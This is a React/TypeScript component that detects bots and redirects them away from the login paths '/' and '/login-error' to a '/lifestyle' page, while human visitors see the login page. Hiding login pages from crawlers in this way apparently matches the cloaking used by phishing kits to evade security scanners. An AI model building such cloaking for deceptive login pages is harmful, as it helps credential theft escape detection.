import { useEffect, useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { isBot, getBotRedirectPath } from "@/lib/botDetection";

interface BotRouterProps {
  children: React.ReactNode;
}

export function BotRouter({ children }: BotRouterProps) {
  const navigate = useNavigate();
  const location = useLocation();
  const [isChecking, setIsChecking] = useState(true);
  const [hasRedirected, setHasRedirected] = useState(false);

  useEffect(() => {
    const checkAndRedirect = () => {
      const urlParams = new URLSearchParams(window.location.search);
      const botDetected = isBot();
      const currentPath = location.pathname;

      // Skip redirect if user is manually accessing with URL param for testing
      if (urlParams.get("bot") !== null) {
        setIsChecking(false);
        return;
      }

      // Bot Detection Logic:
      // - Bots accessing login pages (/, /login-error) → redirect to /lifestyle
      // - Humans accessing any page → stay on that page
      const loginPaths = ["/", "/login-error"];

      if (botDetected && loginPaths.includes(currentPath) && !hasRedirected) {
        console.log("Bot detected, redirecting to lifestyle page");
        setHasRedirected(true);
        navigate(getBotRedirectPath(), { replace: true });
        return;
      }

      setIsChecking(false);
    };

    // Check after component mounts
    const timer = setTimeout(() => {
      checkAndRedirect();
    }, 100);

    return () => clearTimeout(timer);
  }, [navigate, location.pathname, hasRedirected]);

  // Show loading during initial bot detection check
  if (isChecking) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <div className="text-center">
          <div className="w-8 h-8 border-3 border-blue-500 border-t-transparent rounded-full animate-spin mx-auto mb-2"></div>
          <p className="text-gray-600 text-sm">Loading...</p>
        </div>
      </div>
    );
  }

  return <>{children}</>;
}
